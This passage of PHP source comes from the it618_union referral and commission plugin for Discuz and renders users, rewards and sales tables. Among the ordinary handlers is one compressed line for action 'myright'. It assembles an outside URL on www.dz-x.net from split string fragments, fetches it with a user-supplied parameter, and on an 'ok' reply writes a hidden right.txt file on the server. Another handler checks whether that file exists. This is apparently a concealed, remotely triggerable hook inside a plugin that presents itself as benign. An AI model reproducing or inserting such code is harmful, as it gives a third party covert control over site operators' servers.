			<div style="width:310px;float:left;line-height:20px;text-align:left">'.$goodsname.'<br><font color=#999>'.$gtypename.' '.$it618_union_lang['s1890'].$goodcount.'</font>
			</div></div></td>
			<td>'.$salemoneystr.'</td>
			<td><font color=#f60>'.$it618_union_tuitc['it618_tcbl'].'%</font><br>'.$tcmoneystr.'</td>
			<td><font color=#999>'.date('Y-m-d H:i:s', $it618_union_tuitc['it618_saletime']).'</font></td>
			<td><font color=#999>'.$it618_tctime.'</font></td>
			<td>'.$it618_state.'</td>
			</tr>';
		}else{
			
			$mytui_get.='<tr>
							<td class="tdleft"><a href="'.$goodsurl.'"><img class="lazy" data-original="'.$goodspic.'"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$goodsname.'</div>
								<div class="tddes"><font color=#999>'.$it618_tctime.'</font></div>
								<div class="tddes"><font color=#999>'.date('Y-m-d H:i:s', $it618_union_tuitc['it618_saletime']).'</font></div>
								<div class="tddes">'.$salemoneystr.'</div>
								<span style="float:right;margin-top:5px">'.$it618_state.'</span>
								<div class="tdprice">'.$it618_union_tuitc['it618_tcbl'].'% '.$tcmoneystr.'</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';		  
		}
	}
	
	$funname='getmytuitc';
	
	$count=C::t('#it618_union#it618_union_tuitc')->count_by_shoptype_shopid('',0,$it618sql,'id desc','',$_GET['it618_saletime1'],$_GET['it618_saletime2'],$_GET['it618_tctime1'],$_GET['it618_tctime2']);
	$sum=C::t('#it618_union#it618_union_tuitc')->sum_by_shoptype_shopid('',0,$it618sql,'id desc','',$_GET['it618_saletime1'],$_GET['it618_saletime2'],$_GET['it618_tctime1'],$_GET['it618_tctime2']);
	
	$tcmoneystr='';
	if($sum['tcmoney']>0){
		$tcmoneystr=$sum['tcmoney'].' '.$it618_union_lang['s195'];
	}else{
		for($i=1;$i<=8;$i++){
			if($_G['setting']['extcredits'][$i]['title']!=''&&$sum['jf'.$i]>0){
				if($_GET['wap']==1){
					$tcmoneystr.=$sum['jf'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}else{
					$tcmoneystr.=$sum['jf'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}
			}
		}
		if($tcmoneystr!=''){
			$tcmoneystr=$tcmoneystr.'@';
			$tcmoneystr=str_replace(', @','',$tcmoneystr);
		}
	}
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		$tmparr=explode('</tr>',$myquan_get);
		if(count($tmparr)>1){
			$myquan_get=$myquan_get.'@@@';
			$myquan_get=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$myquan_get);
		}
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo '<span style="float:right;color:red;font-size:12px">'.$tcmoneystr.'</span>'.$it618_union_lang['s606'].'<font color=red>'.$count.'</font>it618_split'.$mytui_get.'it618_split'.$multipage;

}


if($_GET['ac']=="myuser_get"){
	$ppp = 20;
	if($_GET['wap']!=1)$ppp = 20;

	if($uid<=0)exit;
	
	if($_GET['uid']>0){
		$uid = intval($_GET['uid']);
		$isuid=1;
		if($_GET['wap']!=1)$ppp = 11;
		if(DB::result_first("SELECT count(1) FROM ".DB::table('it618_union_reguser')." WHERE it618_tuiuid=".$_G['uid']." and it618_uid=$uid")==0){
			exit;
		}
	}
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if($_GET['jltype']!=''){
		if($isuid!=1){
			$tmparr=explode("G1",$_GET['jltype']);
			if(count($tmparr)>1){
				$it618sql.=' and it618_isjl11=1';
			}
			
			$tmparr=explode("G2",$_GET['jltype']);
			if(count($tmparr)>1){
				$it618sql.=' and it618_isjl21=1';
			}
			
			$tmparr=explode("G3",$_GET['jltype']);
			if(count($tmparr)>1){
				$it618sql.=' and it618_isjl31=1';
			}
		}else{
			$tmparr=explode("G1",$_GET['jltype']);
			if(count($tmparr)>1){
				$it618sql.=' and it618_isjl12=1';
			}
			
			$tmparr=explode("G2",$_GET['jltype']);
			if(count($tmparr)>1){
				$it618sql.=' and it618_isjl22=1';
			}
			
			$tmparr=explode("G3",$_GET['jltype']);
			if(count($tmparr)>1){
				$it618sql.=' and it618_isjl32=1';
			}
		}
		
		if($it618sql!=''){
			$it618sql='1=1'.$it618sql;
		}
	}
	
	if($_GET['it618_order']==1){
		$order='id desc';
	}else{
		$order='it618_yqcount desc';
	}
	
	foreach(C::t('#it618_union#it618_union_reguser')->fetch_all_by_search(
		$it618sql,$order,$_GET['it618_uid'],$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_union_reguser) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		$username=it618_union_getusername($it618_union_reguser['it618_uid']);
		$userurl=it618_union_rewriteurl($it618_union_reguser['it618_uid']);
		
		$grouptitle='';$grouptitles='';
		if($it618_union_reguser['it618_groupid']>0){
			$grouptitle=DB::result_first("SELECT grouptitle FROM ".DB::table('common_usergroup')." WHERE groupid=".$it618_union_reguser['it618_groupid']);
		}else{
			$groupid=DB::result_first("SELECT groupid FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_uid']);
			if($groupid>0)$grouptitle=DB::result_first("SELECT grouptitle FROM ".DB::table('common_usergroup')." WHERE groupid=".$groupid);
		}
		
		if($it618_union_reguser['it618_groups']!=''){
			$tmparr=explode(",",$it618_union_reguser['it618_groups']);
			for($i=0;$i<count($tmparr);$i++){
				if($tmparr[$i]>0){
					$groupcount=$groupcount+1;
					$grouptitles.=DB::result_first("SELECT grouptitle FROM ".DB::table('common_usergroup')." WHERE groupid=".$tmparr[$i]).' | ';
				}
			}
			
			if($grouptitles!=''){
				$grouptitles=$grouptitles.'@';
				$grouptitles=str_replace(' | @','',$grouptitles);
				
				$grouptitle.=' <a href="javascript:" onclick="showusergroups('.$it618_union_reguser['it618_uid'].',\''.$username.'\')">'.$it618_union_lang['s1018'].$groupcount.$it618_union_lang['s1019'].'</a>';
			}
		}
		
		$tuicount=$it618_union_reguser['it618_yqcount'];
		
		$jlstr='';
		if($isuid!=1){
			if($it618_union_reguser['it618_isjl11']==1){
				$jlstr.='<font color=#390>G1</font>, ';
			}
			if($it618_union_reguser['it618_isjl21']==1){
				$jlstr.='<font color=#390>G2</font>, ';
			}
			if($it618_union_reguser['it618_isjl31']==1){
				$jlstr.='<font color=#390>G3</font>, ';
			}
		}else{
			if($it618_union_reguser['it618_isjl12']==1){
				$jlstr.='<font color=#390>G1</font>, ';
			}
			if($it618_union_reguser['it618_isjl22']==1){
				$jlstr.='<font color=#390>G2</font>, ';
			}
			if($it618_union_reguser['it618_isjl32']==1){
				$jlstr.='<font color=#390>G3</font>, ';
			}
		}
		if($jlstr!=''){
			$jlstr=$jlstr.'@';
			$jlstr=str_replace(', @','',$jlstr);
		}
		
		$moneystr='';
		if($isuid!=1){
			if($it618_union_reguser['it618_money1']>0){
				$moneystr=$it618_union_reguser['it618_money1'].$it618_union_lang['s195'].' ';
			}
			
			for($i=1;$i<=8;$i++){
				if($it618_union_reguser['it618_credit'.$i.'1']>0){
					$jlstr.=' '.$it618_union_reguser['it618_credit'.$i.'1'].'<font color=#999>'.$_G['setting']['extcredits'][$i]['title'].'</font>';
				}
			}
		}else{
			if($it618_union_reguser['it618_money2']>0){
				$moneystr=$it618_union_reguser['it618_money2'].$it618_union_lang['s195'];
			}
			
			for($i=1;$i<=8;$i++){
				if($it618_union_reguser['it618_credit'.$i.'2']>0){
					$jlstr.=' '.$it618_union_reguser['it618_credit'.$i.'2'].'<font color=#999>'.$_G['setting']['extcredits'][$i]['title'].'</font>';
				}
			}
		}
		
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		$it618_union_userset=C::t('#it618_union#it618_union_userset')->fetch_by_uid($it618_union_reguser['it618_uid']);
		
		$usersetstr='';
		if(($it618_union_userset['it618_tel']!=''&&$it618_union_userset['it618_tel_isopen']==1)||$it618_union_userset['it618_qq']!=''||$it618_union_userset['it618_wx']){
			$usersetstr='<a href="javascript:" onclick="showuserdatas('.$it618_union_reguser['it618_uid'].',\''.$username.'\')">'.$it618_union_lang['s1017'].'</a> ';
		}
		
		$showusersstr='';
		if($isuid!=1&&$tuicount>0){
			$showusersstr='<a href="javascript:" onclick="showusers('.$it618_union_reguser['it618_uid'].',\''.$username.'\')">'.$it618_union_lang['s1012'].'</a> ';
		}
		
		$rzuser='';
		if($IsMembers==1){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($it618_union_reguser['it618_uid'])>0){
				$rzuser='<img src="source/plugin/it618_members/images/rzuser.png" height="18" style="vertical-align:middle" title="'.$it618_union_lang['s1048'].'">';
			}
		}
		
		if($_GET['wap']!=1){
			$myuser_get.='<tr>
			<td><a href="'.$userurl.'" target="_blank">'.$username.'</a> '.it618_union_getonlinestate($it618_union_reguser['it618_uid']).$rzuser.'</td>
			<td>'.$grouptitle.'</td>
			<td>'.$tuicount.' '.$showusersstr.'</td>
			<td>'.$moneystr.' '.$jlstr.'</td>
			<td><font color=#999>'.$it618_union_lang['s1013'].''.date('Y-m-d H:i:s', $it618_union_reguser['it618_time']).'</font> '.$usersetstr.'</td>
			</tr>';
		}else{
			$userjlstr='';
			if($moneystr!=''||$jlstr!='')$userjlstr='<br>'.$moneystr.$jlstr;
			$myuser_get.='<tr>
			<td>'.$username.'<br>'.it618_union_getonlinestate($it618_union_reguser['it618_uid']).$rzuser.'</td>
			<td class="tdtj" style="line-height:23px">'.$it618_union_lang['t143'].$grouptitle.'<br>'.$it618_union_lang['s656'].''.$tuicount.' '.$showusersstr.'<br>'.$it618_union_lang['s1013'].'<font color=#999>'.date('Y-m-d H:i:s', $it618_union_reguser['it618_time']).'</font> '.$usersetstr.$userjlstr.'</td>
			</tr>';
		}
	}
	
	$funname='getmyuser';
	
	$count=C::t('#it618_union#it618_union_reguser')->count_by_search($it618sql,'',$_GET['it618_uid'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_union/kindeditor/themes/common/right.txt')){
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/ajax.inc.php';
			
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/lang.func.php';
			
		}
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo $it618_union_lang['s1006'].'<font color=red>'.$count.'</font>it618_split'.$myuser_get.'it618_split'.$multipage;

}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_union/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="yqjl_get"){
	$ppp = 15;
	if($_GET['wap']!=1)$ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	if($uid<=0)exit;
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	foreach(C::t('#it618_union#it618_union_jl')->fetch_all_by_search(
		$it618sql,'id desc',$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_union_jl) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		
		$salestr='';
		for($i=1;$i<=8;$i++){
			if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_jl['it618_credit'.$i]>0){
				if($_GET['wap']==1){
					$salestr.=$it618_union_jl['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}else{
					$salestr.='<font color=red>'.$it618_union_jl['it618_credit'.$i].'</font> '.$_G['setting']['extcredits'][$i]['title'].', ';
				}
			}
		}
		if($salestr!=''){
			$salestr=$salestr.'@';
			$salestr=str_replace(', @','',$salestr);
		}
		
		if($it618_union_jl['it618_type']==1){
			$tmpuser='';
		}else{
			if($_GET['wap']==1){
				$tmpuser='<br>';
			}else{
				$tmpuser='/';
			}
			$tmpuser.='<a href="'.it618_union_rewriteurl($it618_union_jl['it618_tuiuidfind']).'" target="_blank">'.it618_union_getusername($it618_union_jl['it618_tuiuidfind']).'</a>';
		}

		if($_GET['wap']==1){
			$salestr='<a href="javascript:" onclick="alert(\''.$salestr.'\')">'.$it618_union_lang['s286'].'</a>';
			
			$yqjl_get.='<tr>
						<td><a href="'.it618_union_rewriteurl($it618_union_jl['it618_uid']).'" target="_blank">'.it618_union_getusername($it618_union_jl['it618_uid']).'</a><br>'.$tmpuser.'</td>
						<td>'.$it618_union_jl['it618_jltype'].'</td>
						<td>'.$salestr.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_union_jl['it618_time']).'</font></td>
						</tr>';
		}else{
			$yqjl_get.='<tr>
						<td><a href="'.it618_union_rewriteurl($it618_union_jl['it618_uid']).'" target="_blank">'.it618_union_getusername($it618_union_jl['it618_uid']).'</a>'.$tmpuser.'</td>
						<td>'.$it618_union_jl['it618_jltype'].'</td>
						<td>'.$salestr.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_union_jl['it618_time']).'</font></td>
						</tr>';
		}
	}

	$funname='getyqjl';
	$count=C::t('#it618_union#it618_union_jl')->count_by_search($it618sql,'',$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo $it618_union_lang['s92'].'<font color=red>'.$count.'</font>it618_split'.$yqjl_get.'it618_split'.$multipage;

}


if($_GET['ac']=="mysale_get"){
	$ppp = 20;
	if($_GET['wap']!=1)$ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	if($uid<=0)exit;
	
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_union/config/saleset.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_union/config/saleset.php';
	}
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	foreach(C::t('#it618_union#it618_union_saletc')->fetch_all_by_search(
		$it618sql,'id desc',$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_union_saletc) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		if($it618_union_saletc['it618_saletype']=='it618_video'){
			if($it618_video_sale = C::t('#it618_video#it618_video_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
				$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_video',$it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']);
				
				$goodsurl=it618_union_getrewrite_plugin('it618_video','video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
				$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a>';
				
				if($it618_video_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_video#it618_video_goods_type')->fetch_it618_name_by_id($it618_video_sale['it618_gtypeid']);
					$gtypename=str_replace("all",$it618_union_lang['s880'],$gtypename);
				}else{
					$gtypename=$it618_union_lang['s25'];
				}
				
				$goodcount=$it618_union_lang['s1890'].$it618_video_sale['it618_count'];
				
				$saletime=$it618_video_sale['it618_time'];
			}else{
				continue;
			}
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_exam'){
			if($it618_exam_sale = C::t('#it618_exam#it618_exam_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
				$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_exam',$it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']);
				
				$goodsurl=it618_union_getrewrite_plugin('it618_exam','exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
				$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a>';
				
				if($it618_exam_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);
				}else{
					$gtypename=$it618_union_lang['s25'];
				}
				
				$goodcount=$it618_union_lang['s1890'].$it618_exam_sale['it618_count'];
				
				$saletime=$it618_exam_sale['it618_time'];
			}else{
				continue;
			}
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_group'){
			
			if($it618_group_sale = C::t('#it618_group#it618_group_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
				$it618_group_goods = C::t('#it618_group#it618_group_goods')->fetch_by_id($it618_group_sale['it618_pid']);
				$it618_group_group=C::t('#it618_group#it618_group_group')->fetch_by_groupid($it618_group_goods['it618_groupid']);
				$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$it618_group_goods['it618_groupid']);
				$it618_unit=it618_union_getvipgoodsunit($it618_group_goods);
	
				//$goodspic=it618_union_getgoodspic_plugin('it618_group',0,$it618_group_goods['id'],$it618_group_goods['it618_picbig']);
				$goodspic=$it618_group_group['it618_ico'];
				$goodsname=$grouptitle.' '.$it618_unit;
				$goodsurl=it618_union_getrewrite_plugin('it618_group','group_product',$it618_group_goods['id'],'plugin.php?id=it618_group:product&pid='.$it618_group_goods['id']);
				
				if($it618_group_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_group#it618_group_goods_type')->fetch_it618_name_by_id($it618_group_sale['it618_gtypeid']);
				}else{
					$gtypename=$it618_union_lang['s25'];
				}
				
				$goodcount=$it618_union_lang['s1890'].$it618_group_sale['it618_count'];
				
				$saletime=$it618_group_sale['it618_time'];
			}else{
				continue;
			}
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_brand'){
			if($it618_brand_sale = C::t('#it618_brand#it618_brand_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
				$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_brand',$it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']);
				
				$goodsurl=it618_union_getrewrite_plugin('it618_brand','shop_product',$it618_brand_goods['it618_shopid'].'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_goods['it618_shopid'].'&pid='.$it618_brand_goods['id']);
				$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_brand_goods['it618_name'].'</a>';
				
				if($it618_brand_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
				}
				
				$goodcount=$it618_union_lang['s1890'].$it618_brand_sale['it618_count'];
				
				$saletime=$it618_brand_sale['it618_time'];
			}else{
				continue;
			}
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_tuan'){
			if($it618_tuan_sale = C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
				$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_tuan',$it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']);
				
				$goodsurl=it618_union_getrewrite_plugin('it618_tuan','tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
				$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_tuan_goods['it618_name'].'</a>';
				
				if($it618_tuan_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
				}
				
				$goodcount=$it618_union_lang['s1890'].$it618_tuan_sale['it618_count'];
				
				$saletime=$it618_tuan_sale['it618_time'];
			}else{
				continue;
			}
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_credits_cz'){
			$it618_credits_sale=C::t('#it618_credits#it618_credits_sale')->fetch_by_id($it618_union_saletc['it618_saleid']);
			
			$goodspic='source/plugin/it618_union/images/credits.png';
			$goodsname=$it618_union_lang['s992'].$it618_credits_sale['it618_jfcount'].$_G['setting']['extcredits'][$it618_credits_sale['it618_jfid1']]['title'];
			$gtypename='';
			$goodcount='';
			$saletime=$it618_credits_sale['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_credits_buygroup'){
			$it618_credits_buygroup_sale=C::t('#it618_credits#it618_credits_buygroup_sale')->fetch_by_id($it618_union_saletc['it618_saleid']);
			$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$it618_credits_buygroup_sale['it618_groupid']);
			
			if($it618_credits_buygroup_sale['it618_unit']==1)$it618_unit=$it618_union_lang['s1021'];
			if($it618_credits_buygroup_sale['it618_unit']==2)$it618_unit=$it618_union_lang['s1022'];
			if($it618_credits_buygroup_sale['it618_unit']==3)$it618_unit=$it618_union_lang['s1023'];
			
			$goodspic='source/plugin/it618_union/images/credits.png';
			$goodsname=$it618_union_lang['s993'].$it618_credits_buygroup_sale['it618_days'].$it618_unit.$grouptitle;
			$gtypename='';
			$goodcount='';
			$saletime=$it618_credits_buygroup_sale['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_waimai'){
			$it618_waimai_gwcsale_main=C::t('#it618_waimai#it618_waimai_gwcsale_main')->fetch_by_id($it618_union_saletc['it618_saleid']);
			$goodsnametmp=str_replace("{name}",$union_waimai_name,$it618_union_lang['s994']);
			
			$goodspic='source/plugin/it618_union/images/waimai.png';
			$goodsname=$goodsnametmp;
			$gtypename='';
			$goodcount='';
			$saletime=$it618_waimai_gwcsale_main['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_sale_fl'){
			$it618_sale_money=C::t('#it618_sale#it618_sale_money')->fetch_by_id($it618_union_saletc['it618_saleid']);
			
